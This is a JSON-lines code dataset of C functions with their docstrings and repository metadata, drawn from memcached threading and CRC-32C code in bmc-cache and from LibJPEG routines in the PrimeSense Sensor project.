{"docstring": "/* Multiply a matrix by itself over GF(2).  Both mat and square must have 32\n   rows. */\n", "func_signal": "static inline void gf2_matrix_square(uint32_t *square, uint32_t *mat)", "code": "{\n    int n;\n\n    for (n = 0; n < 32; n++)\n        square[n] = gf2_matrix_times(mat, mat[n]);\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Returns a fresh connection queue item.\n */\n", "func_signal": "static CQ_ITEM *cqi_new(void)", "code": "{\n    CQ_ITEM *item = NULL;\n    pthread_mutex_lock(&cqi_freelist_lock);\n    if (cqi_freelist) {\n        item = cqi_freelist;\n        cqi_freelist = item->next;\n    }\n    pthread_mutex_unlock(&cqi_freelist_lock);\n\n    if (NULL == item) {\n        int i;\n\n        /* Allocate a bunch of items at once to reduce fragmentation */\n        item = malloc(sizeof(CQ_ITEM) * ITEMS_PER_ALLOC);\n        if (NULL == item) {\n            STATS_LOCK();\n            stats.malloc_fails++;\n            STATS_UNLOCK();\n            return NULL;\n        }\n\n        /*\n         * Link together all the new items except the first one\n         * (which we'll return to the caller) for placement on\n         * the freelist.\n         */\n        for (i = 2; i < ITEMS_PER_ALLOC; i++)\n            item[i - 1].next = &item[i];\n\n        pthread_mutex_lock(&cqi_freelist_lock);\n        item[ITEMS_PER_ALLOC - 1].next = cqi_freelist;\n        cqi_freelist = &item[1];\n        pthread_mutex_unlock(&cqi_freelist_lock);\n    }\n\n    return item;\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Re-dispatches a connection back to the original thread. Can be called from\n * any side thread borrowing a connection.\n */\n", "func_signal": "void redispatch_conn(conn *c)", "code": "{\n    CQ_ITEM *item = cqi_new();\n    char buf[1];\n    if (item == NULL) {\n        /* Can't cleanly redispatch connection. close it forcefully. */\n        c->state = conn_closed;\n        close(c->sfd);\n        return;\n    }\n    LIBEVENT_THREAD *thread = c->thread;\n    item->sfd = c->sfd;\n    item->init_state = conn_new_cmd;\n    item->c = c;\n    item->mode = queue_redispatch;\n\n    cq_push(thread->new_conn_queue, item);\n\n    buf[0] = 'c';\n    if (write(thread->notify_send_fd, buf, 1) != 1) {\n        perror(\"Writing to thread notify pipe\");\n    }\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Frees a connection queue item (adds it to the freelist.)\n */\n", "func_signal": "static void cqi_free(CQ_ITEM *item)", "code": "{\n    pthread_mutex_lock(&cqi_freelist_lock);\n    item->next = cqi_freelist;\n    cqi_freelist = item;\n    pthread_mutex_unlock(&cqi_freelist_lock);\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* Must not be called with any deeper locks held */\n", "func_signal": "void pause_threads(enum pause_thread_types type)", "code": "{\n    char buf[1];\n    int i;\n\n    buf[0] = 0;\n    switch (type) {\n        case PAUSE_ALL_THREADS:\n            slabs_rebalancer_pause();\n            lru_maintainer_pause();\n            lru_crawler_pause();\n#ifdef EXTSTORE\n            storage_compact_pause();\n            storage_write_pause();\n#endif\n        case PAUSE_WORKER_THREADS:\n            buf[0] = 'p';\n            pthread_mutex_lock(&worker_hang_lock);\n            break;\n        case RESUME_ALL_THREADS:\n            slabs_rebalancer_resume();\n            lru_maintainer_resume();\n            lru_crawler_resume();\n#ifdef EXTSTORE\n            storage_compact_resume();\n            storage_write_resume();\n#endif\n        case RESUME_WORKER_THREADS:\n            pthread_mutex_unlock(&worker_hang_lock);\n            break;\n        default:\n            fprintf(stderr, \"Unknown lock type: %d\\n\", type);\n            assert(1 == 0);\n            break;\n    }\n\n    /* Only send a message if we have one. */\n    if (buf[0] == 0) {\n        return;\n    }\n\n    pthread_mutex_lock(&init_lock);\n    init_count = 0;\n    for (i = 0; i < settings.num_threads; i++) {\n        if (write(threads[i].notify_send_fd, buf, 1) != 1) {\n            perror(\"Failed writing to notify pipe\");\n            /* TODO: This is a fatal problem. Can it ever happen temporarily? */\n        }\n    }\n    wait_for_thread_registration(settings.num_threads);\n    pthread_mutex_unlock(&init_lock);\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* Take a length and build four lookup tables for applying the zeros operator\n   for that length, byte-by-byte on the operand. */\n", "func_signal": "static void crc32c_zeros(uint32_t zeros[][256], size_t len)", "code": "{\n    uint32_t n;\n    uint32_t op[32];\n\n    crc32c_zeros_op(op, len);\n    for (n = 0; n < 256; n++) {\n        zeros[0][n] = gf2_matrix_times(op, n);\n        zeros[1][n] = gf2_matrix_times(op, n << 8);\n        zeros[2][n] = gf2_matrix_times(op, n << 16);\n        zeros[3][n] = gf2_matrix_times(op, n << 24);\n    }\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Does arithmetic on a numeric item value.\n */\n", "func_signal": "enum delta_result_type add_delta(conn *c, const char *key,\n                                 const size_t nkey, bool incr,\n                                 const int64_t delta, char *buf,\n                                 uint64_t *cas)", "code": "{\n    enum delta_result_type ret;\n    uint32_t hv;\n\n    hv = hash(key, nkey);\n    item_lock(hv);\n    ret = do_add_delta(c, key, nkey, incr, delta, buf, cas, hv);\n    item_unlock(hv);\n    return ret;\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Links an item into the LRU and hashtable.\n */\n", "func_signal": "int item_link(item *item)", "code": "{\n    int ret;\n    uint32_t hv;\n\n    hv = hash(ITEM_key(item), item->nkey);\n    item_lock(hv);\n    ret = do_item_link(item, hv);\n    item_unlock(hv);\n    return ret;\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* HWCAP for crc32 */\n", "func_signal": "static uint32_t crc32c_hw_aarch64(uint32_t crc, const void* buf, size_t len)", "code": "{\n        const uint8_t* p_buf = buf;\n        uint64_t crc64bit = crc;\n        for (size_t i = 0; i < len / sizeof(uint64_t); i++) {\n                CRC32CX(crc64bit, *(uint64_t*) p_buf);\n                p_buf += sizeof(uint64_t);\n        }\n\n        uint32_t crc32bit = (uint32_t) crc64bit;\n        len &= sizeof(uint64_t) - 1;\n        switch (len) {\n        case 7:\n                CRC32CB(crc32bit, *p_buf++);\n        case 6:\n                CRC32CH(crc32bit, *(uint16_t*) p_buf);\n                p_buf += 2;\n        case 4:\n                CRC32CW(crc32bit, *(uint32_t*) p_buf);\n                break;\n        case 3:\n                CRC32CB(crc32bit, *p_buf++);\n        case 2:\n                CRC32CH(crc32bit, *(uint16_t*) p_buf);\n                break;\n        case 5:\n                CRC32CW(crc32bit, *(uint32_t*) p_buf);\n                p_buf += 4;\n        case 1:\n                CRC32CB(crc32bit, *p_buf);\n                break;\n        case 0:\n                break;\n        }\n\n        return crc32bit;\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* Table-driven software version as a fall-back.  This is about 15 times slower\n   than using the hardware instructions.  This assumes little-endian integers,\n   as is the case on Intel processors that the assembler code here is for. */\n", "func_signal": "static uint32_t crc32c_sw(uint32_t crci, const void *buf, size_t len)", "code": "{\n    const unsigned char *next = buf;\n    uint64_t crc;\n\n    pthread_once(&crc32c_once_sw, crc32c_init_sw);\n    crc = crci ^ 0xffffffff;\n    while (len && ((uintptr_t)next & 7) != 0) {\n        crc = crc32c_table[0][(crc ^ *next++) & 0xff] ^ (crc >> 8);\n        len--;\n    }\n    while (len >= 8) {\n        crc ^= *(uint64_t *)next;\n        crc = crc32c_table[7][crc & 0xff] ^\n              crc32c_table[6][(crc >> 8) & 0xff] ^\n              crc32c_table[5][(crc >> 16) & 0xff] ^\n              crc32c_table[4][(crc >> 24) & 0xff] ^\n              crc32c_table[3][(crc >> 32) & 0xff] ^\n              crc32c_table[2][(crc >> 40) & 0xff] ^\n              crc32c_table[1][(crc >> 48) & 0xff] ^\n              crc32c_table[0][crc >> 56];\n        next += 8;\n        len -= 8;\n    }\n    while (len) {\n        crc = crc32c_table[0][(crc ^ *next++) & 0xff] ^ (crc >> 8);\n        len--;\n    }\n    return (uint32_t)crc ^ 0xffffffff;\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* Initialize tables for shifting crcs. */\n", "func_signal": "static void crc32c_init_hw(void)", "code": "{\n    crc32c_zeros(crc32c_long, LONG);\n    crc32c_zeros(crc32c_short, SHORT);\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* Construct an operator to apply len zeros to a crc.  len must be a power of\n   two.  If len is not a power of two, then the result is the same as for the\n   largest power of two less than len.  The result for len == 0 is the same as\n   for len == 1.  A version of this routine could be easily written for any\n   len, but that is not needed for this application. */\n", "func_signal": "static void crc32c_zeros_op(uint32_t *even, size_t len)", "code": "{\n    int n;\n    uint32_t row;\n    uint32_t odd[32];       /* odd-power-of-two zeros operator */\n\n    /* put operator for one zero bit in odd */\n    odd[0] = POLY;              /* CRC-32C polynomial */\n    row = 1;\n    for (n = 1; n < 32; n++) {\n        odd[n] = row;\n        row <<= 1;\n    }\n\n    /* put operator for two zero bits in even */\n    gf2_matrix_square(even, odd);\n\n    /* put operator for four zero bits in odd */\n    gf2_matrix_square(odd, even);\n\n    /* first square will put the operator for one zero byte (eight zero bits),\n       in even -- next square puts operator for two zero bytes in odd, and so\n       on, until len has been rotated down to zero */\n    do {\n        gf2_matrix_square(even, odd);\n        len >>= 1;\n        if (len == 0)\n            return;\n        gf2_matrix_square(odd, even);\n        len >>= 1;\n    } while (len);\n\n    /* answer ended up in odd -- copy to even */\n    for (n = 0; n < 32; n++)\n        even[n] = odd[n];\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Processes an incoming \"handle a new connection\" item. This is called when\n * input arrives on the libevent wakeup pipe.\n */\n", "func_signal": "static void thread_libevent_process(int fd, short which, void *arg)", "code": "{\n    LIBEVENT_THREAD *me = arg;\n    CQ_ITEM *item;\n    char buf[1];\n    conn *c;\n    unsigned int timeout_fd;\n\n    if (read(fd, buf, 1) != 1) {\n        if (settings.verbose > 0)\n            fprintf(stderr, \"Can't read from libevent pipe\\n\");\n        return;\n    }\n\n    switch (buf[0]) {\n    case 'c':\n        item = cq_pop(me->new_conn_queue);\n\n        if (NULL == item) {\n            break;\n        }\n        switch (item->mode) {\n            case queue_new_conn:\n                c = conn_new(item->sfd, item->init_state, item->event_flags,\n                                   item->read_buffer_size, item->transport,\n                                   me->base, item->ssl);\n                if (c == NULL) {\n                    if (IS_UDP(item->transport)) {\n                        fprintf(stderr, \"Can't listen for events on UDP socket\\n\");\n                        exit(1);\n                    } else {\n                        if (settings.verbose > 0) {\n                            fprintf(stderr, \"Can't listen for events on fd %d\\n\",\n                                item->sfd);\n                        }\n#ifdef TLS\n                        if (item->ssl) {\n                            SSL_shutdown(item->ssl);\n                            SSL_free(item->ssl);\n                        }\n#endif\n                        close(item->sfd);\n                    }\n                } else {\n                    c->thread = me;\n#ifdef TLS\n                    if (settings.ssl_enabled && c->ssl != NULL) {\n                        assert(c->thread && c->thread->ssl_wbuf);\n                        c->ssl_wbuf = c->thread->ssl_wbuf;\n                    }\n#endif\n                }\n                break;\n\n            case queue_redispatch:\n                conn_worker_readd(item->c);\n                break;\n        }\n        cqi_free(item);\n        break;\n    /* we were told to pause and report in */\n    case 'p':\n        register_thread_initialized();\n        break;\n    /* a client socket timed out */\n    case 't':\n        if (read(fd, &timeout_fd, sizeof(timeout_fd)) != sizeof(timeout_fd)) {\n            if (settings.verbose > 0)\n                fprintf(stderr, \"Can't read timeout fd from libevent pipe\\n\");\n            return;\n        }\n        conn_close_idle(conns[timeout_fd]);\n        break;\n    /* asked to stop */\n    case 's':\n        event_base_loopexit(me->base, NULL);\n        break;\n    }\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Allocates a new item.\n */\n", "func_signal": "item *item_alloc(char *key, size_t nkey, int flags, rel_time_t exptime, int nbytes)", "code": "{\n    item *it;\n    /* do_item_alloc handles its own locks */\n    it = do_item_alloc(key, nkey, flags, exptime, nbytes);\n    return it;\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* Compute CRC-32C using the Intel hardware instruction. */\n", "func_signal": "static uint32_t crc32c_hw(uint32_t crc, const void *buf, size_t len)", "code": "{\n    const unsigned char *next = buf;\n    const unsigned char *end;\n    uint64_t crc0, crc1, crc2;      /* need to be 64 bits for crc32q */\n\n    /* populate shift tables the first time through */\n    pthread_once(&crc32c_once_hw, crc32c_init_hw);\n\n    /* pre-process the crc */\n    crc0 = crc ^ 0xffffffff;\n\n    /* compute the crc for up to seven leading bytes to bring the data pointer\n       to an eight-byte boundary */\n    while (len && ((uintptr_t)next & 7) != 0) {\n        __asm__(\"crc32b\\t\" \"(%1), %0\"\n                : \"=r\"(crc0)\n                : \"r\"(next), \"0\"(crc0));\n        next++;\n        len--;\n    }\n\n    /* compute the crc on sets of LONG*3 bytes, executing three independent crc\n       instructions, each on LONG bytes -- this is optimized for the Nehalem,\n       Westmere, Sandy Bridge, and Ivy Bridge architectures, which have a\n       throughput of one crc per cycle, but a latency of three cycles */\n    while (len >= LONG*3) {\n        crc1 = 0;\n        crc2 = 0;\n        end = next + LONG;\n        do {\n            __asm__(\"crc32q\\t\" \"(%3), %0\\n\\t\"\n                    \"crc32q\\t\" LONGx1 \"(%3), %1\\n\\t\"\n                    \"crc32q\\t\" LONGx2 \"(%3), %2\"\n                    : \"=r\"(crc0), \"=r\"(crc1), \"=r\"(crc2)\n                    : \"r\"(next), \"0\"(crc0), \"1\"(crc1), \"2\"(crc2));\n            next += 8;\n        } while (next < end);\n        crc0 = crc32c_shift(crc32c_long, crc0) ^ crc1;\n        crc0 = crc32c_shift(crc32c_long, crc0) ^ crc2;\n        next += LONG*2;\n        len -= LONG*3;\n    }\n\n    /* do the same thing, but now on SHORT*3 blocks for the remaining data less\n       than a LONG*3 block */\n    while (len >= SHORT*3) {\n        crc1 = 0;\n        crc2 = 0;\n        end = next + SHORT;\n        do {\n            __asm__(\"crc32q\\t\" \"(%3), %0\\n\\t\"\n                    \"crc32q\\t\" SHORTx1 \"(%3), %1\\n\\t\"\n                    \"crc32q\\t\" SHORTx2 \"(%3), %2\"\n                    : \"=r\"(crc0), \"=r\"(crc1), \"=r\"(crc2)\n                    : \"r\"(next), \"0\"(crc0), \"1\"(crc1), \"2\"(crc2));\n            next += 8;\n        } while (next < end);\n        crc0 = crc32c_shift(crc32c_short, crc0) ^ crc1;\n        crc0 = crc32c_shift(crc32c_short, crc0) ^ crc2;\n        next += SHORT*2;\n        len -= SHORT*3;\n    }\n\n    /* compute the crc on the remaining eight-byte units less than a SHORT*3\n       block */\n    end = next + (len - (len & 7));\n    while (next < end) {\n        __asm__(\"crc32q\\t\" \"(%1), %0\"\n                : \"=r\"(crc0)\n                : \"r\"(next), \"0\"(crc0));\n        next += 8;\n    }\n    len &= 7;\n\n    /* compute the crc for up to seven trailing bytes */\n    while (len) {\n        __asm__(\"crc32b\\t\" \"(%1), %0\"\n                : \"=r\"(crc0)\n                : \"r\"(next), \"0\"(crc0));\n        next++;\n        len--;\n    }\n\n    /* return a post-processed crc */\n    return (uint32_t)crc0 ^ 0xffffffff;\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* Construct table for software CRC-32C calculation. */\n", "func_signal": "static void crc32c_init_sw(void)", "code": "{\n    uint32_t n, crc, k;\n\n    for (n = 0; n < 256; n++) {\n        crc = n;\n        crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;\n        crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;\n        crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;\n        crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;\n        crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;\n        crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;\n        crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;\n        crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;\n        crc32c_table[0][n] = crc;\n    }\n    for (n = 0; n < 256; n++) {\n        crc = crc32c_table[0][n];\n        for (k = 1; k < 8; k++) {\n            crc = crc32c_table[0][crc & 0xff] ^ (crc >> 8);\n            crc32c_table[k][n] = crc;\n        }\n    }\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Process some data in subsequent passes of a multi-pass case.\n * We process the equivalent of one fully interleaved MCU row (\"iMCU\" row)\n * per call, ie, v_samp_factor block rows for each component in the scan.\n * The data is obtained from the virtual arrays and fed to the entropy coder.\n * Returns TRUE if the iMCU row is completed, FALSE if suspended.\n *\n * NB: input_buf is ignored; it is likely to be a NULL pointer.\n */\n", "func_signal": "METHODDEF(boolean)\ncompress_output (j_compress_ptr cinfo, JSAMPIMAGE input_buf)", "code": "{\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n  JDIMENSION MCU_col_num;\t/* index of current MCU within row */\n  int blkn, ci, xindex, yindex, yoffset;\n  JDIMENSION start_col;\n  JBLOCKARRAY buffer[MAX_COMPS_IN_SCAN];\n  JBLOCKROW buffer_ptr;\n  jpeg_component_info *compptr;\n\n  /* Align the virtual buffers for the components used in this scan.\n   * NB: during first pass, this is safe only because the buffers will\n   * already be aligned properly, so jmemmgr.c won't need to do any I/O.\n   */\n  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n    compptr = cinfo->cur_comp_info[ci];\n    buffer[ci] = (*cinfo->mem->access_virt_barray)\n      ((j_common_ptr) cinfo, coef->whole_image[compptr->component_index],\n       coef->iMCU_row_num * compptr->v_samp_factor,\n       (JDIMENSION) compptr->v_samp_factor, FALSE);\n  }\n\n  /* Loop to process one whole iMCU row */\n  for (yoffset = coef->MCU_vert_offset; yoffset < coef->MCU_rows_per_iMCU_row;\n       yoffset++) {\n    for (MCU_col_num = coef->mcu_ctr; MCU_col_num < cinfo->MCUs_per_row;\n\t MCU_col_num++) {\n      /* Construct list of pointers to DCT blocks belonging to this MCU */\n      blkn = 0;\t\t\t/* index of current DCT block within MCU */\n      for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n\tcompptr = cinfo->cur_comp_info[ci];\n\tstart_col = MCU_col_num * compptr->MCU_width;\n\tfor (yindex = 0; yindex < compptr->MCU_height; yindex++) {\n\t  buffer_ptr = buffer[ci][yindex+yoffset] + start_col;\n\t  for (xindex = 0; xindex < compptr->MCU_width; xindex++) {\n\t    coef->MCU_buffer[blkn++] = buffer_ptr++;\n\t  }\n\t}\n      }\n      /* Try to write the MCU. */\n      if (! (*cinfo->entropy->encode_mcu) (cinfo, coef->MCU_buffer)) {\n\t/* Suspension forced; update state counters and exit */\n\tcoef->MCU_vert_offset = yoffset;\n\tcoef->mcu_ctr = MCU_col_num;\n\treturn FALSE;\n      }\n    }\n    /* Completed an MCU row, but perhaps not an iMCU row */\n    coef->mcu_ctr = 0;\n  }\n  /* Completed the iMCU row, advance counters for next one */\n  coef->iMCU_row_num++;\n  start_iMCU_row(cinfo);\n  return TRUE;\n}", "path": "Source\\External\\LibJPEG\\jccoefct.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Set up for an output pass, and perform any dummy pass(es) needed.\n * Common subroutine for jpeg_start_decompress and jpeg_start_output.\n * Entry: global_state = DSTATE_PRESCAN only if previously suspended.\n * Exit: If done, returns TRUE and sets global_state for proper output mode.\n *       If suspended, returns FALSE and sets global_state = DSTATE_PRESCAN.\n */\n", "func_signal": "LOCAL(boolean)\noutput_pass_setup (j_decompress_ptr cinfo)", "code": "{\n  if (cinfo->global_state != DSTATE_PRESCAN) {\n    /* First call: do pass setup */\n    (*cinfo->master->prepare_for_output_pass) (cinfo);\n    cinfo->output_scanline = 0;\n    cinfo->global_state = DSTATE_PRESCAN;\n  }\n  /* Loop over any required dummy passes */\n  while (cinfo->master->is_dummy_pass) {\n#ifdef QUANT_2PASS_SUPPORTED\n    /* Crank through the dummy pass */\n    while (cinfo->output_scanline < cinfo->output_height) {\n      JDIMENSION last_scanline;\n      /* Call progress monitor hook if present */\n      if (cinfo->progress != NULL) {\n\tcinfo->progress->pass_counter = (long) cinfo->output_scanline;\n\tcinfo->progress->pass_limit = (long) cinfo->output_height;\n\t(*cinfo->progress->progress_monitor) ((j_common_ptr) cinfo);\n      }\n      /* Process some data */\n      last_scanline = cinfo->output_scanline;\n      (*cinfo->main->process_data) (cinfo, (JSAMPARRAY) NULL,\n\t\t\t\t    &cinfo->output_scanline, (JDIMENSION) 0);\n      if (cinfo->output_scanline == last_scanline)\n\treturn FALSE;\t\t/* No progress made, must suspend */\n    }\n    /* Finish up dummy pass, and set up for another one */\n    (*cinfo->master->finish_output_pass) (cinfo);\n    (*cinfo->master->prepare_for_output_pass) (cinfo);\n    cinfo->output_scanline = 0;\n#else\n    ERREXIT(cinfo, JERR_NOT_COMPILED);\n#endif /* QUANT_2PASS_SUPPORTED */\n  }\n  /* Ready for application to drive output pass through\n   * jpeg_read_scanlines or jpeg_read_raw_data.\n   */\n  cinfo->global_state = cinfo->raw_data_out ? DSTATE_RAW_OK : DSTATE_SCANNING;\n  return TRUE;\n}", "path": "Source\\External\\LibJPEG\\jdapistd.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Alternate compression function: just write an abbreviated table file.\n * Before calling this, all parameters and a data destination must be set up.\n *\n * To produce a pair of files containing abbreviated tables and abbreviated\n * image data, one would proceed as follows:\n *\n *\t\tinitialize JPEG object\n *\t\tset JPEG parameters\n *\t\tset destination to table file\n *\t\tjpeg_write_tables(cinfo);\n *\t\tset destination to image file\n *\t\tjpeg_start_compress(cinfo, FALSE);\n *\t\twrite data...\n *\t\tjpeg_finish_compress(cinfo);\n *\n * jpeg_write_tables has the side effect of marking all tables written\n * (same as jpeg_suppress_tables(..., TRUE)).  Thus a subsequent start_compress\n * will not re-emit the tables unless it is passed write_all_tables=TRUE.\n */\n", "func_signal": "GLOBAL(void)\njpeg_write_tables (j_compress_ptr cinfo)", "code": "{\n  if (cinfo->global_state != CSTATE_START)\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n\n  /* (Re)initialize error mgr and destination modules */\n  (*cinfo->err->reset_error_mgr) ((j_common_ptr) cinfo);\n  (*cinfo->dest->init_destination) (cinfo);\n  /* Initialize the marker writer ... bit of a crock to do it here. */\n  jinit_marker_writer(cinfo);\n  /* Write them tables! */\n  (*cinfo->marker->write_tables_only) (cinfo);\n  /* And clean up. */\n  (*cinfo->dest->term_destination) (cinfo);\n  /*\n   * In library releases up through v6a, we called jpeg_abort() here to free\n   * any working memory allocated by the destination manager and marker\n   * writer.  Some applications had a problem with that: they allocated space\n   * of their own from the library memory manager, and didn't want it to go\n   * away during write_tables.  So now we do nothing.  This will cause a\n   * memory leak if an app calls write_tables repeatedly without doing a full\n   * compression cycle or otherwise resetting the JPEG object.  However, that\n   * seems less bad than unexpectedly freeing memory in the normal case.\n   * An app that prefers the old behavior can call jpeg_abort for itself after\n   * each call to jpeg_write_tables().\n   */\n}", "path": "Source\\External\\LibJPEG\\jcapimin.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Initialize postprocessing controller.\n */\n", "func_signal": "GLOBAL(void)\njinit_d_post_controller (j_decompress_ptr cinfo, boolean need_full_buffer)", "code": "{\n  my_post_ptr post;\n\n  post = (my_post_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(my_post_controller));\n  cinfo->post = (struct jpeg_d_post_controller *) post;\n  post->pub.start_pass = start_pass_dpost;\n  post->whole_image = NULL;\t/* flag for no virtual arrays */\n  post->buffer = NULL;\t\t/* flag for no strip buffer */\n\n  /* Create the quantization buffer, if needed */\n  if (cinfo->quantize_colors) {\n    /* The buffer strip height is max_v_samp_factor, which is typically\n     * an efficient number of rows for upsampling to return.\n     * (In the presence of output rescaling, we might want to be smarter?)\n     */\n    post->strip_height = (JDIMENSION) cinfo->max_v_samp_factor;\n    if (need_full_buffer) {\n      /* Two-pass color quantization: need full-image storage. */\n      /* We round up the number of rows to a multiple of the strip height. */\n#ifdef QUANT_2PASS_SUPPORTED\n      post->whole_image = (*cinfo->mem->request_virt_sarray)\n\t((j_common_ptr) cinfo, JPOOL_IMAGE, FALSE,\n\t cinfo->output_width * cinfo->out_color_components,\n\t (JDIMENSION) jround_up((long) cinfo->output_height,\n\t\t\t\t(long) post->strip_height),\n\t post->strip_height);\n#else\n      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n#endif /* QUANT_2PASS_SUPPORTED */\n    } else {\n      /* One-pass color quantization: just make a strip buffer. */\n      post->buffer = (*cinfo->mem->alloc_sarray)\n\t((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t cinfo->output_width * cinfo->out_color_components,\n\t post->strip_height);\n    }\n  }\n}", "path": "Source\\External\\LibJPEG\\jdpostct.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Initialize coefficient buffer controller.\n */\n", "func_signal": "GLOBAL(void)\njinit_c_coef_controller (j_compress_ptr cinfo, boolean need_full_buffer)", "code": "{\n  my_coef_ptr coef;\n\n  coef = (my_coef_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(my_coef_controller));\n  cinfo->coef = (struct jpeg_c_coef_controller *) coef;\n  coef->pub.start_pass = start_pass_coef;\n\n  /* Create the coefficient buffer. */\n  if (need_full_buffer) {\n#ifdef FULL_COEF_BUFFER_SUPPORTED\n    /* Allocate a full-image virtual array for each component, */\n    /* padded to a multiple of samp_factor DCT blocks in each direction. */\n    int ci;\n    jpeg_component_info *compptr;\n\n    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n\t ci++, compptr++) {\n      coef->whole_image[ci] = (*cinfo->mem->request_virt_barray)\n\t((j_common_ptr) cinfo, JPOOL_IMAGE, FALSE,\n\t (JDIMENSION) jround_up((long) compptr->width_in_blocks,\n\t\t\t\t(long) compptr->h_samp_factor),\n\t (JDIMENSION) jround_up((long) compptr->height_in_blocks,\n\t\t\t\t(long) compptr->v_samp_factor),\n\t (JDIMENSION) compptr->v_samp_factor);\n    }\n#else\n    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n#endif\n  } else {\n    /* We only need a single-MCU buffer. */\n    JBLOCKROW buffer;\n    int i;\n\n    buffer = (JBLOCKROW)\n      (*cinfo->mem->alloc_large) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t  C_MAX_BLOCKS_IN_MCU * SIZEOF(JBLOCK));\n    for (i = 0; i < C_MAX_BLOCKS_IN_MCU; i++) {\n      coef->MCU_buffer[i] = buffer + i;\n    }\n    coef->whole_image[0] = NULL; /* flag for no virtual arrays */\n  }\n}", "path": "Source\\External\\LibJPEG\\jccoefct.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Initialize for an output pass in buffered-image mode.\n */\n", "func_signal": "GLOBAL(boolean)\njpeg_start_output (j_decompress_ptr cinfo, int scan_number)", "code": "{\n  if (cinfo->global_state != DSTATE_BUFIMAGE &&\n      cinfo->global_state != DSTATE_PRESCAN)\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  /* Limit scan number to valid range */\n  if (scan_number <= 0)\n    scan_number = 1;\n  if (cinfo->inputctl->eoi_reached &&\n      scan_number > cinfo->input_scan_number)\n    scan_number = cinfo->input_scan_number;\n  cinfo->output_scan_number = scan_number;\n  /* Perform any dummy output passes, and set up for the real pass */\n  return output_pass_setup(cinfo);\n}", "path": "Source\\External\\LibJPEG\\jdapistd.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
